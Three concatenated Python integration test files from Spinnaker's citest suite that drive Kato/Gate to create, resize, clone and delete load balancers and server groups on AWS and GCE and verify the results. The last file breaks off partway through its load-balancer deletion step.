# Copyright 2015 Google Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
Tests to see if CloudDriver/Kato can interoperate with Amazon Web Services.

Sample Usage:
    Assuming you have created $PASSPHRASE_FILE (which you should chmod 400):
    and $CITEST_ROOT points to the root directory of this repository
    (which is . if you execute this from the root)
    and $AWS_PROFILE is the name of the aws_cli profile for authenticating
    to observe aws resources:

    This first command would be used if Spinnaker itself was deployed on GCE.
    The test needs to talk to GCE to get to spinnaker (using the gce_* params)
    then talk to AWS (using the aws_profile with the aws cli program) to
    verify Spinnaker had the right effects on AWS.

    PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
       python $CITEST_ROOT/spinnaker/spinnaker_system/aws_kato_test.py \
       --gce_ssh_passphrase_file=$PASSPHRASE_FILE \
       --gce_project=$PROJECT \
       --gce_zone=$GCE_ZONE \
       --gce_instance=$INSTANCE \
       --test_aws_zone=$AWS_ZONE \
       --aws_profile=$AWS_PROFILE

   or

     This second command would be used if Spinnaker itself was deployed some
     place reachable through a direct IP connection. It could be, but is not
     necessarily deployed on GCE. It is similar to above except it does not
     need to go through GCE and its firewalls to locate the actual IP endpoints
     rather those are already known and accessible.

     PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
       python $CITEST_ROOT/spinnaker/spinnaker_system/aws_kato_test.py \
       --native_hostname=host-running-kato
       --test_aws_zone=$AWS_ZONE \
       --aws_profile=$AWS_PROFILE

   Note that the $AWS_ZONE is not directly used, rather it is a standard
   parameter being used to infer the region. The test is going to pick
   some different availability zones within the region in order to test kato.
   These are currently hardcoded in.
"""

# Standard python modules.
import sys

# citest modules.
import citest.aws_testing as aws
import citest.json_contract as jc                    
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.kato as kato


class AwsKatoTestScenario(sk.SpinnakerTestScenario):
  """Defines the scenario for the test.

  This scenario defines the different test operations.
  We're going to:
    Create a Load Balancer
    Delete a Load Balancer
  """

  __use_lb_name = ''     # The load balancer name.

  @classmethod
  def new_agent(cls, bindings):
    """Implements the base class interface to create a new agent.

    This method is called by the base classes during setup/initialization.

    Args:
      bindings: The bindings dictionary with configuration information
        that this factory can draw from to initialize. If the factory would
        like additional custom bindings it could add them to initArgumentParser.

    Returns:
      A citest.service_testing.BaseAgent that can interact with Kato.
      This is the agent that test operations will be posted to.
    """
    return kato.new_agent(bindings)

  def upsert_load_balancer(self):
    """Creates OperationContract for upsertLoadBalancer.

    Calls Spinnaker's upsertLoadBalancer with a configuration, then verifies
    that the expected resources and configurations are visible on AWS. See
    the contract builder for more info on what the expectations are.
    """
    detail_raw_name = 'katotestlb' + self.test_id
    self.__use_lb_name = detail_raw_name

    bindings = self.bindings
    region = bindings['TEST_AWS_REGION']
    avail_zones = [region + 'a', region + 'b']

    listener = {
        'Listener': {
            'InstancePort':7001,
            'LoadBalancerPort':80
        }
    }
    health_check = {
        'HealthyThreshold':8,
        'UnhealthyThreshold':3,
        'Interval':123,
        'Timeout':12,
        'Target':'HTTP:%d/healthcheck' % listener['Listener']['InstancePort']
    }

    payload = self.agent.type_to_payload(
        'upsertAmazonLoadBalancerDescription',
        {
            'credentials': bindings['AWS_CREDENTIALS'],
            'clusterName': bindings['TEST_APP'],
            'name': detail_raw_name,
            'availabilityZones': {region: avail_zones},
            'listeners': [{
                'internalProtocol': 'HTTP',
                'internalPort': listener['Listener']['InstancePort'],
                'externalProtocol': 'HTTP',
                'externalPort': listener['Listener']['LoadBalancerPort']
            }],
            'healthCheck': health_check['Target'],
            'healthTimeout': health_check['Timeout'],
            'healthInterval': health_check['Interval'],
            'healthyThreshold': health_check['HealthyThreshold'],
            'unhealthyThreshold': health_check['UnhealthyThreshold']
        })

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Load Balancer Added', retryable_for_secs=30)
     .collect_resources(
         aws_module='elb',
         command='describe-load-balancers',
         args=['--load-balancer-names', self.__use_lb_name])
     .contains_pred_list([
         jc.PathContainsPredicate(                    
             'LoadBalancerDescriptions/HealthCheck', health_check),
         jc.PathPredicate(                    
             'LoadBalancerDescriptions/AvailabilityZones',                    
             jc.LIST_SIMILAR(avail_zones)),                    
         jc.PathElementsContainPredicate(                    
             'LoadBalancerDescriptions/ListenerDescriptions', listener)
         ])
    )

    return st.OperationContract(
        self.new_post_operation(
            title='upsert_amazon_load_balancer', data=payload, path='ops'),
        contract=builder.build())

  def delete_load_balancer(self):
    """Creates OperationContract for deleteLoadBalancer.

    To verify the operation, we just check that the AWS resources
    created by upsert_load_balancer are no longer visible on AWS.
    """
    region = self.bindings['TEST_AWS_REGION']
    payload = self.agent.type_to_payload(
        'deleteAmazonLoadBalancerDescription',
        {
            'credentials': self.bindings['AWS_CREDENTIALS'],
            'regions': [region],
            'loadBalancerName': self.__use_lb_name
        })

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Load Balancer Removed')
     .collect_resources(
         aws_module='elb',
         command='describe-load-balancers',
         args=['--load-balancer-names', self.__use_lb_name],
         no_resources_ok=True)
     .excludes_path_value('LoadBalancerName', self.__use_lb_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_amazon_load_balancer', data=payload, path='ops'),
        contract=builder.build())


class AwsKatoIntegrationTest(st.AgentTestCase):
  """The test fixture for the SmokeTest.

  This is implemented using citest OperationContract instances that are
  created by the AwsKatoTestScenario.
  """
  # pylint: disable=missing-docstring

  def test_a_upsert_load_balancer(self):
    self.run_test_case(self.scenario.upsert_load_balancer())

  def test_z_delete_load_balancer(self):
    self.run_test_case(self.scenario.delete_load_balancer())


def main():
  """Implements the main method running this smoke test."""

  defaults = {
      'TEST_APP': 'awskatotest' + AwsKatoTestScenario.DEFAULT_TEST_ID
  }

  return st.ScenarioTestRunner.main(
      AwsKatoTestScenario,
      default_binding_overrides=defaults,
      test_case_list=[AwsKatoIntegrationTest])


if __name__ == '__main__':
  sys.exit(main())

# Copyright 2016 Google Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
Smoke test to see if Spinnaker can interoperate with Amazon Web Services.

See testable_service/integration_test.py and spinnaker_testing/spinnaker.py
for more details.

The smoke test will use ssh to peek at the spinnaker configuration
to determine the managed project it should verify, and to determine
the spinnaker account name to use when sending it commands.

Sample Usage:
    Assuming you have created $PASSPHRASE_FILE (which you should chmod 400)
    and $CITEST_ROOT points to the root directory of this repository
    (which is . if you execute this from the root)

  PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
    python $CITEST_ROOT/spinnaker/spinnaker_system/smoke_test.py \
    --gce_ssh_passphrase_file=$PASSPHRASE_FILE \
    --gce_project=$PROJECT \
    --gce_zone=$ZONE \
    --gce_instance=$INSTANCE
    --test_aws_zone=$AWS_ZONE \
    --aws_profile=$AWS_PROFILE
or
  PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
    python $CITEST_ROOT/spinnaker/spinnaker_system/smoke_test.py \
    --native_hostname=host-running-smoke-test
    --test_aws_zone=$AWS_ZONE \
    --aws_profile=$AWS_PROFILE

  Note that the $AWS_ZONE is not directly used, rather it is a standard
  parameter being used to infer the region. The test is going to pick
  some different availability zones within the region in order to test kato.
  These are currently hardcoded in.
"""

# Standard python modules.
import sys

# citest modules.
import citest.aws_testing as aws
import citest.json_contract as jc
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.gate as gate


class AwsSmokeTestScenario(sk.SpinnakerTestScenario):
  """Defines the scenario for the smoke test.

  This scenario defines the different test operations.
  We're going to:
    Create a Spinnaker Application
    Create a Load Balancer
    Create a Server Group
    Delete each of the above (in reverse order)
  """

  @classmethod
  def new_agent(cls, bindings):
    """Implements citest.service_testing.AgentTestScenario.new_agent."""
    return gate.new_agent(bindings)

  @classmethod
  def initArgumentParser(cls, parser, defaults=None):
    """Initialize command line argument parser.

    Args:
      parser: argparse.ArgumentParser
    """
    super(AwsSmokeTestScenario, cls).initArgumentParser(parser,
                                                        defaults=defaults)

    defaults = defaults or {}
    parser.add_argument(
        '--test_component_detail',
        default='fe',
        help='Refinement for component name to create.')

  def __init__(self, bindings, agent=None):
    """Constructor.

    Args:
      bindings: [dict] The data bindings to use to configure the scenario.
      agent: [GateAgent] The agent for invoking the test operations on Gate.
    """
    super(AwsSmokeTestScenario, self).__init__(bindings, agent)

    bindings = self.bindings
    bindings['TEST_APP_COMPONENT_NAME'] = (
        '{app}-{stack}-{detail}'.format(
            app=bindings['TEST_APP'],
            stack=bindings['TEST_STACK'],
            detail=bindings['TEST_COMPONENT_DETAIL']))

    # We'll call out the app name because it is widely used
    # because it scopes the context of our activities.
    # pylint: disable=invalid-name
    self.TEST_APP = bindings['TEST_APP']

  def create_app(self):
    """Creates OperationContract that creates a new Spinnaker Application."""
    contract = jc.Contract()
    return st.OperationContract(
        self.agent.make_create_app_operation(
            bindings=self.bindings, application=self.TEST_APP),
        contract=contract)

  def delete_app(self):
    """Creates OperationContract that deletes a new Spinnaker Application."""
    contract = jc.Contract()
    return st.OperationContract(
        self.agent.make_delete_app_operation(
            bindings=self.bindings, application=self.TEST_APP),
        contract=contract)

  def upsert_load_balancer(self, use_vpc):
    """Creates OperationContract for upsertLoadBalancer.

    Calls Spinnaker's upsertLoadBalancer with a configuration, then verifies
    that the expected resources and configurations are visible on AWS. See
    the contract builder for more info on what the expectations are.

    Args:
      use_vpc: [bool] if True configure a VPC otherwise dont.
    """
    bindings = self.bindings
    load_balancer_name = bindings['TEST_APP_COMPONENT_NAME']

    # We're assuming that the given region has 'A' and 'B' availability
    # zones. This seems conservative but might be brittle since we permit
    # any region.
    region = bindings['TEST_AWS_REGION']
    avail_zones = [region + 'a', region + 'b']

    if use_vpc:
      # TODO(ewiseblatt): 20160301
      # We're hardcoding the VPC here, but not sure which we really want.
      # I think this comes from the spinnaker.io installation instructions.
      # What's interesting about this is that it is a 10.* CidrBlock,
      # as opposed to the others, which are public IPs. All this is sensitive
      # as to where the TEST_AWS_VPC_ID came from so this is going to be
      # brittle. Ideally we only need to know the vpc_id and can figure the
      # rest out based on what we have available.
      subnet_type = 'internal (defaultvpc)'
      vpc_id = bindings['TEST_AWS_VPC_ID']

      # Not really sure how to determine this value in general.
      security_groups = ['default']

      # The resulting load balancer will only be available in the zone of
      # the subnet we are using. We'll figure that out by looking up the
      # subnet we want.
      subnet_details = self.aws_observer.get_resource_list(
          root_key='Subnets',
          aws_command='describe-subnets',
          aws_module='ec2',
          args=['--filters',
                'Name=vpc-id,Values={vpc_id}'
                ',Name=tag:Name,Values=defaultvpc.internal.{region}'
                .format(vpc_id=vpc_id, region=region)])
      try:
        expect_avail_zones = [subnet_details[0]['AvailabilityZone']]
      except KeyError:
        raise ValueError('vpc_id={0} appears to be unknown'.format(vpc_id))
    else:
      subnet_type = ""
      vpc_id = None
      security_groups = None
      expect_avail_zones = avail_zones

      # This will be a second load balancer not used in other tests.
      # Decorate the name so as not to confuse it.
      load_balancer_name += '-pub'


    listener = {
        'Listener': {
            'InstancePort':80,
            'LoadBalancerPort':80
        }
    }
    health_check = {
        'HealthyThreshold': 8,
        'UnhealthyThreshold': 3,
        'Interval': 12,
        'Timeout': 6,
        'Target':'HTTP:%d/' % listener['Listener']['InstancePort']
    }

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'type': 'upsertLoadBalancer',
            'cloudProvider': 'aws',
            # 'loadBalancerName': load_balancer_name,


            'credentials': bindings['AWS_CREDENTIALS'],
            'name': load_balancer_name,
            'stack': bindings['TEST_STACK'],
            'detail': '',
            'region': bindings['TEST_AWS_REGION'],

            'availabilityZones': {region: avail_zones},
            'regionZones': avail_zones,
            'listeners': [{
                'internalProtocol': 'HTTP',
                'internalPort': listener['Listener']['InstancePort'],
                'externalProtocol': 'HTTP',
                'externalPort': listener['Listener']['LoadBalancerPort']
            }],
            'healthCheck': health_check['Target'],
            'healthCheckProtocol': 'HTTP',
            'healthCheckPort': listener['Listener']['LoadBalancerPort'],
            'healthCheckPath': '/',
            'healthTimeout': health_check['Timeout'],
            'healthInterval': health_check['Interval'],
            'healthyThreshold': health_check['HealthyThreshold'],
            'unhealthyThreshold': health_check['UnhealthyThreshold'],

            'user': '[anonymous]',
            'usePreferredZones': True,
            'vpcId': vpc_id,
            'subnetType': subnet_type,
            # If I set security group to this then I get an error it is missing.
            # bindings['TEST_AWS_SECURITY_GROUP_ID']],
            'securityGroups': security_groups
        }],
        description='Create Load Balancer: ' + load_balancer_name,
        application=self.TEST_APP)

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Load Balancer Added', retryable_for_secs=10)
     .collect_resources(
         aws_module='elb',
         command='describe-load-balancers',
         args=['--load-balancer-names', load_balancer_name])
     .contains_pred_list([
         jc.PathContainsPredicate(                    
             'LoadBalancerDescriptions/HealthCheck', health_check),
         jc.PathPredicate(                    
             'LoadBalancerDescriptions/AvailabilityZones',                    
             jc.LIST_SIMILAR(expect_avail_zones)),                    
         jc.PathElementsContainPredicate(                    
             'LoadBalancerDescriptions/ListenerDescriptions', listener)
         ])
    )

    title_decorator = '_with_vpc' if use_vpc else '_without_vpc'
    return st.OperationContract(
        self.new_post_operation(
            title='upsert_load_balancer' + title_decorator,
            data=payload,
            path='tasks'),
        contract=builder.build())

  def delete_load_balancer(self, use_vpc):
    """Creates OperationContract for deleteLoadBalancer.

    To verify the operation, we just check that the AWS resources
    created by upsert_load_balancer are no longer visible on AWS.

    Args:
      use_vpc: [bool] if True delete the VPC load balancer, otherwise
         the non-VPC load balancer.
    """
    load_balancer_name = self.bindings['TEST_APP_COMPONENT_NAME']
    if not use_vpc:
      # This is the second load balancer, where we decorated the name in upsert.
      load_balancer_name += '-pub'

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'type': 'deleteLoadBalancer',
            'cloudProvider': 'aws',

            'credentials': self.bindings['AWS_CREDENTIALS'],
            'regions': [self.bindings['TEST_AWS_REGION']],
            'loadBalancerName': load_balancer_name
        }],
        description='Delete Load Balancer: {0} in {1}:{2}'.format(
            load_balancer_name,
            self.bindings['AWS_CREDENTIALS'],
            self.bindings['TEST_AWS_REGION']),
        application=self.TEST_APP)

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Load Balancer Removed')
     .collect_resources(
         aws_module='elb',
         command='describe-load-balancers',
         args=['--load-balancer-names', load_balancer_name],
         no_resources_ok=True)
     .excludes_path_value('LoadBalancerName', load_balancer_name))

    title_decorator = '_with_vpc' if use_vpc else '_without_vpc'
    return st.OperationContract(
        self.new_post_operation(
            title='delete_load_balancer' + title_decorator,
            data=payload,
            path='tasks'),
        contract=builder.build())

  def create_server_group(self):
    """Creates OperationContract for createServerGroup.

    To verify the operation, we just check that the AWS Auto Scaling Group
    for the server group was created.
    """
    bindings = self.bindings
    load_balancer_name = bindings['TEST_APP_COMPONENT_NAME']

    # Spinnaker determines the group name created,
    # which will be the following:
    group_name = '{app}-{stack}-v000'.format(
        app=self.TEST_APP, stack=bindings['TEST_STACK'])

    region = bindings['TEST_AWS_REGION']
    avail_zones = [region + 'a', region + 'b']

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'type': 'createServerGroup',
            'cloudProvider': 'aws',
            'application': self.TEST_APP,
            'credentials': bindings['AWS_CREDENTIALS'],
            'strategy':'',
            'capacity': {'min':2, 'max':2, 'desired':2},
            'targetHealthyDeployPercentage': 100,
            'loadBalancers': [load_balancer_name],
            'cooldown': 8,
            'healthCheckType': 'EC2',
            'healthCheckGracePeriod': 40,
            'instanceMonitoring': False,
            'ebsOptimized': False,
            'iamRole': bindings['AWS_IAM_ROLE'],
            'terminationPolicies': ['Default'],

            'availabilityZones': {region: avail_zones},
            'keyPair': bindings['AWS_CREDENTIALS'] + '-keypair',
            'suspendedProcesses': [],
            # TODO(ewiseblatt): Inquiring about how this value is determined.
            # It seems to be the "Name" tag value of one of the VPCs
            # but is not the default VPC, which is what we using as the VPC_ID.
            # So I suspect something is out of whack. This name comes from
            # spinnaker.io tutorial. But using the default vpc would probably
            # be more adaptive to the particular deployment.
            'subnetType': 'internal (defaultvpc)',
            'securityGroups': [bindings['TEST_AWS_SECURITY_GROUP_ID']],
            'virtualizationType': 'paravirtual',
            'stack': bindings['TEST_STACK'],
            'freeFormDetails': '',
            'amiName': bindings['TEST_AWS_AMI'],
            'instanceType': 'm1.small',
            'useSourceCapacity': False,
            'account': bindings['AWS_CREDENTIALS'],
            'user': '[anonymous]'
        }],
        description='Create Server Group in ' + group_name,
        application=self.TEST_APP)

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Auto Server Group Added',
                                retryable_for_secs=30)
     .collect_resources('autoscaling', 'describe-auto-scaling-groups',
                        args=['--auto-scaling-group-names', group_name])
     .contains_path_value('AutoScalingGroups', {'MaxSize': 2}))

    return st.OperationContract(
        self.new_post_operation(
            title='create_server_group', data=payload, path='tasks'),
        contract=builder.build())

  def delete_server_group(self):
    """Creates OperationContract for deleteServerGroup.

    To verify the operation, we just check that the AWS Auto Scaling Group
    is no longer visible on AWS (or is in the process of terminating).
    """
    bindings = self.bindings
    group_name = '{app}-{stack}-v000'.format(
        app=self.TEST_APP, stack=bindings['TEST_STACK'])

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'cloudProvider': 'aws',
            'type': 'destroyServerGroup',
            'serverGroupName': group_name,
            'asgName': group_name,
            'region': bindings['TEST_AWS_REGION'],
            'regions': [bindings['TEST_AWS_REGION']],
            'credentials': bindings['AWS_CREDENTIALS'],
            'user': '[anonymous]'
        }],
        application=self.TEST_APP,
        description='DestroyServerGroup: ' + group_name)

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Auto Scaling Group Removed')
     .collect_resources('autoscaling', 'describe-auto-scaling-groups',
                        args=['--auto-scaling-group-names', group_name],
                        no_resources_ok=True)
     .contains_path_value('AutoScalingGroups', {'MaxSize': 0}))

    (builder.new_clause_builder('Instances Are Removed',
                                retryable_for_secs=30)
     .collect_resources('ec2', 'describe-instances', no_resources_ok=True)
     .excludes_path_value('name', group_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_server_group', data=payload, path='tasks'),
        contract=builder.build())


class AwsSmokeTest(st.AgentTestCase):
  """The test fixture for the SmokeTest.

  This is implemented using citest OperationContract instances that are
  created by the AwsSmokeTestScenario.
  """
  # pylint: disable=missing-docstring

  def test_a_create_app(self):
    self.run_test_case(self.scenario.create_app())

  def test_b_upsert_load_balancer_public(self):
    self.run_test_case(self.scenario.upsert_load_balancer(use_vpc=False))

  def test_b_upsert_load_balancer_vpc(self):
    self.run_test_case(self.scenario.upsert_load_balancer(use_vpc=True))

  def test_c_create_server_group(self):
    # We'll permit this to timeout for now
    # because it might be waiting on confirmation
    # but we'll continue anyway because side effects
    # should have still taken place.
    self.run_test_case(self.scenario.create_server_group(), timeout_ok=True)

  def test_x_delete_server_group(self):
    self.run_test_case(self.scenario.delete_server_group(), max_retries=5)

  def test_y_delete_load_balancer_vpc(self):
    self.run_test_case(self.scenario.delete_load_balancer(use_vpc=True),
                       max_retries=5)

  def test_y_delete_load_balancer_pub(self):
    self.run_test_case(self.scenario.delete_load_balancer(use_vpc=False),
                       max_retries=5)

  def test_z_delete_app(self):
    # Give a total of a minute because it might also need
    # an internal cache update
    self.run_test_case(self.scenario.delete_app(),
                       retry_interval_secs=8, max_retries=8)


def main():
  """Implements the main method running this smoke test."""

  defaults = {
      'TEST_STACK': str(AwsSmokeTestScenario.DEFAULT_TEST_ID),
      'TEST_APP': 'smoketest' + AwsSmokeTestScenario.DEFAULT_TEST_ID
  }

  return st.ScenarioTestRunner.main(
      AwsSmokeTestScenario,
      default_binding_overrides=defaults,
      test_case_list=[AwsSmokeTest])


if __name__ == '__main__':
  sys.exit(main())


# Standard python modules.
import time
import sys

# citest modules.
import citest.gcp_testing as gcp
import citest.json_contract as jc                    
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.gate as gate


class GoogleServerGroupTestScenario(sk.SpinnakerTestScenario):

  @classmethod
  def new_agent(cls, bindings):
    '''Implements the base class interface to create a new agent.

    This method is called by the base classes during setup/initialization.

    Args:
      bindings: The bindings dictionary with configuration information
        that this factory can draw from to initialize. If the factory would
        like additional custom bindings it could add them to initArgumentParser.

    Returns:
      A citest.service_testing.BaseAgent that can interact with Gate.
      This is the agent that test operations will be posted to.
    '''
    return gate.new_agent(bindings)

  def __init__(self, bindings, agent=None):
    super(GoogleServerGroupTestScenario, self).__init__(bindings, agent)

    # Our application name and path to post events to.
    self.TEST_APP = bindings['TEST_APP']
    self.__path = 'applications/%s/tasks' % self.TEST_APP

    # The spinnaker stack decorator for our resources.
    self.TEST_STACK = bindings['TEST_STACK']

    self.TEST_REGION = bindings['TEST_GCE_REGION']
    self.TEST_ZONE = bindings['TEST_GCE_ZONE']

    # Resource names used among tests.
    self.__cluster_name = '%s-%s' % (self.TEST_APP, self.TEST_STACK)
    self.__server_group_name = '%s-v000' % self.__cluster_name
    self.__cloned_server_group_name = '%s-v001' % self.__cluster_name
    self.__lb_name = '%s-%s-fe' % (self.TEST_APP, self.TEST_STACK)

  def create_load_balancer(self):
    job = [{
      'cloudProvider': 'gce',
      'loadBalancerName': self.__lb_name,
      'ipProtocol': 'TCP',
      'portRange': '8080',
      'provider': 'gce',
      'stack': self.TEST_STACK,
      'detail': 'frontend',
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'region': self.TEST_REGION,
      'listeners': [{
        'protocol': 'TCP',
        'portRange': '8080',
        'healthCheck': False
      }],
      'name': self.__lb_name,
      'type': 'upsertLoadBalancer',
      'availabilityZones': {self.TEST_REGION: []},
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Load Balancer Created', retryable_for_secs=30)
     .list_resources('forwarding-rules')
     .contains_path_value('name', self.__lb_name))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - create load balancer',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='create_load_balancer', data=payload, path=self.__path),
      contract=builder.build())

  def create_instances(self):
    job = [{
      'application': self.TEST_APP,
      'stack': self.TEST_STACK,
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'zone': self.TEST_ZONE,
      'network': 'default',
      'targetSize': 1,
      'capacity': {
        'min': 1,
        'max': 1,
        'desired': 1
      },
      'availabilityZones': {
        self.TEST_REGION: [self.TEST_ZONE]
      },
      'loadBalancers': [self.__lb_name],
      'instanceMetadata': {
        'load-balancer-names': self.__lb_name
      },
      'cloudProvider': 'gce',
      'image': self.bindings['TEST_GCE_IMAGE_NAME'],
      'instanceType': 'f1-micro',
      'initialNumReplicas': 1,
      'type': 'createServerGroup',
      'account': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Instance Created', retryable_for_secs=150)
     .list_resources('instance-groups')
     .contains_path_value('name', self.__server_group_name))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job,
        description='Server Group Test - create initial server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='create_instances', data=payload, path=self.__path),
      contract=builder.build())

  def resize_server_group(self):
    job = [{
      'targetSize': 2,
      'capacity': {
        'min': 2,
        'max': 2,
        'desired': 2
      },
      'replicaPoolName': self.__server_group_name,
      'numReplicas': 2,
      'region': self.TEST_REGION,
      'zone': self.TEST_ZONE,
      'asgName': self.__server_group_name,
      'type': 'resizeServerGroup',
      'regions': [self.TEST_REGION],
      'zones': [self.TEST_ZONE],
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'cloudProvider': 'gce',
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Resized', retryable_for_secs=90)
     .inspect_resource('instance-groups',
                       self.__server_group_name,
                       ['--zone', self.TEST_ZONE])
     .contains_path_eq('size', 2))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - resize to 2 instances',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='resize_instances', data=payload, path=self.__path),
      contract=builder.build())

  def clone_server_group(self):
    job = [{
      'application': self.TEST_APP,
      'stack': self.TEST_STACK,
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'loadBalancers': [self.__lb_name],
      'targetSize': 1,
      'capacity': {
        'min': 1,
        'max': 1,
        'desired': 1
      },
      'zone': self.TEST_ZONE,
      'network': 'default',
      'instanceMetadata': {'load-balancer-names': self.__lb_name},
      'availabilityZones': {self.TEST_REGION: [self.TEST_ZONE]},
      'cloudProvider': 'gce',
      'source': {
        'account': self.bindings['GCE_CREDENTIALS'],
        'region': self.TEST_REGION,
        'zone': self.TEST_ZONE,
        'serverGroupName': self.__server_group_name,
        'asgName': self.__server_group_name
      },
      'instanceType': 'f1-micro',
      'image': self.bindings['TEST_GCE_IMAGE_NAME'],
      'initialNumReplicas': 1,
      'loadBalancers': [self.__lb_name],
      'type': 'cloneServerGroup',
      'account': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Cloned', retryable_for_secs=90)
     .list_resources('managed-instance-groups')
     .contains_path_value('baseInstanceName', self.__cloned_server_group_name))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - clone server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='clone_server_group', data=payload, path=self.__path),
      contract=builder.build())

  def disable_server_group(self):
    job = [{
      'cloudProvider': 'gce',
      'asgName': self.__server_group_name,
      'serverGroupName': self.__server_group_name,
      'region': self.TEST_REGION,
      'zone': self.TEST_ZONE,
      'type': 'disableServerGroup',
      'regions': [self.TEST_REGION],
      'zones': [self.TEST_ZONE],
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Disabled', retryable_for_secs=90)
     .list_resources('managed-instance-groups')
     .contains_path_value('baseInstanceName', self.__server_group_name)
     .excludes_pred_list([
         jc.PathContainsPredicate('baseInstanceName', self.__server_group_name),                    
         jc.PathContainsPredicate('targetPools', 'https')]))                    

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - disable server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='disable_server_group', data=payload, path=self.__path),
      contract=builder.build())

  def enable_server_group(self):
    job = [{
      'cloudProvider': 'gce',
      'asgName': self.__server_group_name,
      'serverGroupName': self.__server_group_name,
      'region': self.TEST_REGION,
      'zone': self.TEST_ZONE,
      'type': 'enableServerGroup',
      'regions': [self.TEST_REGION],
      'zones': [self.TEST_ZONE],
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Enabled', retryable_for_secs=90)
     .list_resources('managed-instance-groups')
     .contains_pred_list([
         jc.PathContainsPredicate('baseInstanceName', self.__server_group_name),                    
         jc.PathContainsPredicate('targetPools', 'https')]))                    

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - enable server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='enable_server_group', data=payload, path=self.__path),
      contract=builder.build())

  def destroy_server_group(self, version):
    serverGroupName = '%s-%s' % (self.__cluster_name, version)
    job = [{
      'cloudProvider': 'gce',
      'asgName': serverGroupName,
      'serverGroupName': serverGroupName,
      'region': self.TEST_REGION,
      'zone': self.TEST_ZONE,
      'type': 'destroyServerGroup',
      'regions': [self.TEST_REGION],
      'zones': [self.TEST_ZONE],
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Destroyed', retryable_for_secs=90)
     .list_resources('managed-instance-groups')
     .excludes_path_value('baseInstanceName', serverGroupName))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - destroy server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='destroy_server_group', data=payload, path=self.__path),
      contract=builder.build())

  def delete_load_balancer(self):
    job = [{
      "loadBalancerName": self.__lb_name,
      "networkLoadBalancerName": self.__lb_name,
      "region": "us-central1",
      "type": "deleteLoadBalancer",
      "regions": ["us-central1"],
      "credentials": self.bindings['GCE_CREDENTIALS'],
      "cloudProvider": "gce",
      "user": "integration-tests"
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Load Balancer Created', retryable_for_secs=30)
     .list_resources('forwarding-rules')
     .excludes_path_value('name', self.__lb_name))

